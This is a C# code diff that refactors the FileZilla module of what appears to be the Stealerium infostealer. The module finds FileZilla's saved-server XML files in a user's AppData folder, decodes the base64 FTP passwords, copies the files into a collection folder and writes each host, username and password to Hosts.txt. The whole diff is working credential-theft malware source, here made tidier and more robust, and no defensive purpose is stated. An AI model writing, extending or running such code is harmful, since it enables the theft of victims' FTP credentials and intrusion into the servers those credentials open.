@@ -9,74 +9,104 @@ namespace Stealerium.Target
 {
     internal sealed class FileZilla
     {
-        // Get filezilla .xml files
-        private static string[] GetPswPath()
+        // Get FileZilla .xml files paths
+        private static string[] GetFileZillaPaths()
         {
-            var fz = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\";
-            return new[] { fz + "recentservers.xml", fz + "sitemanager.xml" };
+            var fileZillaDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");
+            return new[]
+            {
+                Path.Combine(fileZillaDirectory, "recentservers.xml"),
+                Path.Combine(fileZillaDirectory, "sitemanager.xml")
+            };
         }
 
-        private static List<Password> Steal(string sSavePath)
+        // Load XML from file
+        private static XmlDocument LoadXmlDocument(string filePath)
         {
-            var lpPasswords = new List<Password>();
+            var xmlDocument = new XmlDocument();
+            xmlDocument.Load(filePath);
+            return xmlDocument;
+        }
 
-            var files = GetPswPath();
-            // If files not exists
-            if (!File.Exists(files[0]) && !File.Exists(files[1]))
-                return lpPasswords;
+        // Extract passwords from XML document nodes
+        private static List<Password> ExtractPasswordsFromXml(XmlDocument xmlDocument)
+        {
+            var passwords = new List<Password>();
 
-            foreach (var pwFile in files)
+            foreach (XmlNode node in xmlDocument.GetElementsByTagName("Server"))
+            {
+                var passwordNode = node?["Pass"]?.InnerText;
+                if (string.IsNullOrEmpty(passwordNode)) continue;
+
+                var password = new Password
+                {
+                    Url = $"ftp://{node["Host"]?.InnerText}:{node["Port"]?.InnerText}/",
+                    Username = node["User"]?.InnerText,
+                    Pass = Encoding.UTF8.GetString(Convert.FromBase64String(passwordNode))
+                };
+
+                passwords.Add(password);
+                Counter.FtpHosts++;
+            }
+
+            return passwords;
+        }
+
+        // Copy file to save path
+        private static void CopyFileToSavePath(string filePath, string savePath)
+        {
+            var fileName = Path.GetFileName(filePath);
+            if (fileName != null)
+            {
+                var destinationPath = Path.Combine(savePath, fileName);
+                File.Copy(filePath, destinationPath, overwrite: true);
+            }
+        }
+
+        // Steal passwords from FileZilla configuration files
+        private static List<Password> StealPasswords(string savePath)
+        {
+            var passwords = new List<Password>();
+            var files = GetFileZillaPaths();
+
+            foreach (var file in files)
+            {
+                if (!File.Exists(file)) continue;
+
                 try
                 {
-                    if (!File.Exists(pwFile))
-                        continue;
-
-                    // Open xml document
-                    var xDoc = new XmlDocument();
-                    xDoc.Load(pwFile);
-
-                    foreach (XmlNode xNode in xDoc.GetElementsByTagName("Server"))
-                    {
-                        var innerText = xNode?["Pass"]?.InnerText;
-                        if (innerText == null) continue;
-                        var pPassword = new Password
-                        {
-                            Url = "ftp://" + xNode["Host"]?.InnerText + ":" + xNode["Port"]?.InnerText + "/",
-                            Username = xNode["User"]?.InnerText,
-                            Pass = Encoding.UTF8.GetString(Convert.FromBase64String(innerText))
-                        };
-
-                        Counter.FtpHosts++;
-                        lpPasswords.Add(pPassword);
-                    }
-
-                    // Copy file
-                    File.Copy(pwFile, Path.Combine(sSavePath, new FileInfo(pwFile).Name));
+                    var xmlDocument = LoadXmlDocument(file);
+                    passwords.AddRange(ExtractPasswordsFromXml(xmlDocument));
+                    CopyFileToSavePath(file, savePath);
                 }
                 catch (Exception ex)
                 {
-                    Logging.Log("Filezilla >> Failed collect passwords\n" + ex);
+                    Logging.Log($"FileZilla >> Failed to collect passwords from {file}\n{ex}");
                 }
+            }
 
-            return lpPasswords;
+            return passwords;
         }
 
         // Format FileZilla passwords
-        private static string FormatPassword(Password pPassword)
+        private static string FormatPassword(Password password)
         {
-            return $"Url: {pPassword.Url}\nUsername: {pPassword.Username}\nPassword: {pPassword.Pass}\n\n";
+            return $"Url: {password.Url}\nUsername: {password.Username}\nPassword: {password.Pass}\n\n";
         }
 
-        // Write FileZilla passwords
-        public static void WritePasswords(string sSavePath)
+        // Write FileZilla passwords to Hosts.txt
+        public static void WritePasswords(string savePath)
         {
-            Directory.CreateDirectory(sSavePath);
-            var pPasswords = Steal(sSavePath);
-            if (pPasswords.Count != 0)
+            Directory.CreateDirectory(savePath);
+            var passwords = StealPasswords(savePath);
+
+            if (passwords.Count > 0)
             {
-                foreach (var p in pPasswords)
-                    File.AppendAllText(sSavePath + "\\Hosts.txt", FormatPassword(p));
-                return;
+                var filePath = Path.Combine(savePath, "Hosts.txt");
+                foreach (var password in passwords)
+                {
+                    File.AppendAllText(filePath, FormatPassword(password));
+                }
             }
         }
     }
